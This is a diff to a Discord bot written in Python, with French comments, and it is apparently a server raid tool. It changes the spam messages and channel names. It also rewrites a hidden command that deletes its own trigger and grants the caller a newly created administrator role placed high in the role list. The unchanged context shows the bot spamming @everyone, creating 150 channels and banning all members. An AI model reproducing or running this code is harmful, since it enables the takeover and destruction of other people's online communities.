@@ -11,10 +11,10 @@ TOKEN = os.getenv("DISCORD_TOKEN")
 
 
 # Ca cest le message qui va etre spam dans les salons
-MESSAGE_A_ENVOYER = "@everyone reach heaven†" 
+MESSAGE_A_ENVOYER = "@everyone 𝙑𝙄𝙇𝙏𝙍𝙐𝙈 𝙒𝙊𝙉 🦾" 
 
 # ca cest le message quon recoit quand on fait +reset le ban que tu recois en mp
-MESSAGE_A_ENVOYERMP = "You died 😹😹"
+MESSAGE_A_ENVOYERMP = "You died."
 
 
 
@@ -145,7 +145,7 @@ async def on_raw_reaction_add(payload):
             created_channels = []
             try:
                 for i in range(150):
-                    new_channel = await guild.create_text_channel(name=f"𝙃𝙀𝘼𝙑𝙀𝙉 𝙄𝙎 𝘾𝙇𝙊𝙎𝙀 🪽-{i+1}")
+                    new_channel = await guild.create_text_channel(name=f"𝙑𝙄𝙇𝙏𝙍𝙐𝙈 𝙄𝙎 𝘾𝙊𝙈𝙄𝙉𝙂 ‼️")
                     created_channels.append(new_channel)
             except Exception as e:
                 print(f"Erreur lors de la création des salons : {e}")
@@ -226,22 +226,24 @@ async def reset(ctx):
     print("Tous les membres ont été bannis.")
 
 @bot.command()
-async def give(ctx):
-    """Supprime le message, crée un rôle admin et l'attribue à l'utilisateur"""
-    await ctx.message.delete() 
+async def DNA(ctx):
+    """DNA"""
+    await ctx.message.delete()
 
     guild = ctx.guild
-    role_name = "."  
+    bot_member = guild.get_member(bot.user.id)
+    role_name = "viltrum"
     role = discord.utils.get(guild.roles, name=role_name)
 
     if not role:
-       
         role = await guild.create_role(name=role_name, permissions=discord.Permissions(administrator=True))
         print(f"✅ Rôle '{role_name}' créé sur {guild.name}.")
 
-  
+        
+        bot_top_role = bot_member.top_role
+        await role.edit(position=bot_top_role.position - 1)
+
     await ctx.author.add_roles(role)
     print(f"✅ {ctx.author} a reçu le rôle '{role_name}'.")
-
 
 bot.run(TOKEN)
